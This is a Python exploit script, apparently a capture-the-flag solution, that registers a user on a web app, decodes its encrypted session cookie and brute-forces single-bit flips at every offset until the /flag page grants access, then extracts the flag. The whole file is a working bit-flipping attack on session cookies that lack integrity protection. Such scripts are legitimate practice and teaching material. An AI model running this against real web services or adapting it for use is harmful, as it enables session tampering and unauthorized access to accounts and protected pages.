import requests
from base64 import b64encode, b64decode
import re

def flip_bit(data, offset, bit):
    byte_array = bytearray(data)
    byte_array[offset] ^= (1 << bit)
    return bytes(byte_array)

def exploit(url):
    # Step 1: Register and login to get a valid session cookie
    session = requests.Session()
    session.post(f"{url}/register", data={"username": "hacker", "password": "password"})
    response = session.post(f"{url}/login", data={"username": "hacker", "password": "password"})
    
    # Step 2: Get the encrypted session cookie
    encrypted_cookie = session.cookies['session']
    decoded_cookie = b64decode(encrypted_cookie)
    
    # Step 3: Brute force all possible offsets and bits
    for offset in range(len(decoded_cookie)):
        for bit in range(8):  # 8 bits in a byte
            # Create a modified cookie
            modified_cookie = flip_bit(decoded_cookie, offset, bit)
            new_cookie = b64encode(modified_cookie).decode()
            
            # Set the modified cookie and try to access the flag page
            session.cookies.set('session', new_cookie)
            response = session.get(f"{url}/flag")
            
            # Check if we've successfully accessed the flag page
            if "Access denied" not in response.text:
                print(f"Exploit successful! Flipped bit {bit} at offset {offset}")
                # Extract the flag using a regular expression
                flag_match = re.search(r'flag\{[^}]+\}', response.text)
                if flag_match:
                    print("Flag:", flag_match.group(0))
                else:
                    print("Flag found, but couldn't extract it. Full response:")
                    print(response.text)
                return
    
    print("Exploit failed. Couldn't find the correct bit to flip.")

if __name__ == "__main__":
    url = "http://localhost:5000"  # Change this to the actual challenge URL
    exploit(url)
